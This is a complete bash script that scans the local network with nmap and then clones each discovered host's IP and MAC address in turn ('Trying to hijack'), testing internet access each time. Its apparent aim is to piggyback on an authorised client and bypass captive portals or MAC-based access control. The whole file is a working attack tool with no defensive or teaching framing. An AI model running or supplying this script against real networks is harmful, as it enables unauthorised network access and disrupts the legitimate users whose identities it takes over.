#!/bin/bash

# n  -- Newr do DNS resolution
# sn -- Ping scan - disable port scan
# PR -- ARP based scan
# PS -- TCP SYN Ping
# PA -- TCP ACK Ping
# PU -- UDP Ping
# T4 -- aggressive timings
nmap_flags="-n -sn -PR -PS -PA -PU -T4"

function to_lower() {
    tr '[:upper:]' '[:lower:]'
}

function print() {
    if [[ "$1" = "error" ]]; then
        printf "\e[1;31m%s\e[0m\n" "$2"
    else
        printf "\e[1;32m%s\e[0m\n" "$2"
    fi
}

if [[ $EUID != 0 ]]; then
    print error "This script must be run as root."
    exit 1
fi

if [[ -z "$1" ]]; then
    echo "USAGE: $0 interface"
    exit 1;
fi

interface="$1"

localhost="$(ip addr show dev "$interface" | awk '/inet\s/ {print $2}')"
broadcast="$(ip addr show dev "$interface" | awk '/inet\s/ && /brd\s/ {print $4}')"
local_mac="$(ip addr show dev "$interface" | awk '/link\/ether/ {print $2}' | to_lower)"
local_ip="$(printf "%s\n" "$localhost" | cut -d "/" -f 1)"
netmask="$(printf "%s\n" "$localhost" | cut -d "/" -f 2)"
netaddr="$(sipcalc "$localhost" | awk '/Network address/ {print $NF}')"
network="$netaddr/$netmask"

gateway_ip="$(ip route show | awk '/via\s/ {print $3}')"
gateway_mac="$(nmap $nmap_flags "$gateway_ip" | grep -E -o '[A-F0-9:]{17}' | to_lower)"

function set_address() {
    new_ip="$1"
    new_mac="$2"
    ip link set "$interface" down
    ip link set "$interface" address "$new_mac"
    ip link set "$interface" up
    ip addr flush dev "$interface"
    ip addr add "$new_ip/$netmask" broadcast "$broadcast" dev "$interface"
    ip route add default via "$gateway_ip" dev "$interface"
}

printf "Local ip address:    %s\n" "$localhost"
printf "Local mac address:   %s\n" "$local_mac"
printf "Target network:      %s\n" "$network"
printf "Gateway ip address:  %s\n" "$gateway_ip"
printf "Gateway mac address: %s\n" "$gateway_mac"

printf "\n"
printf "Scanning network...\n"

nmap $nmap_flags --exclude "$local_ip","$gateway_ip" "$network" \
    | awk '/for/ {print $5}; /Address/ {print $3}' \
    | sed '$!N;s/\n/ /' \
    | to_lower > hosts.txt

while read -r host_info; do
    new_ip="$(echo "$host_info" | awk '{print $1}')"
    new_mac="$(echo "$host_info" | awk '{print $2}')"

    printf "%s\n" "Trying to hijack $new_ip $new_mac"
    set_address "$new_ip" "$new_mac"

    for ((i=0; $i < 2; i=$i+1)); do
        sleep 2
        ping -c1 -w1 8.8.8.8 1>/dev/null 2>&1
        if [[ $? -eq 0 ]]; then
            print ok "Success!!!"
            exit 0
        fi
    done

done < hosts.txt

set_address "$local_ip" "$local_mac"
print error "Failed"
exit 1
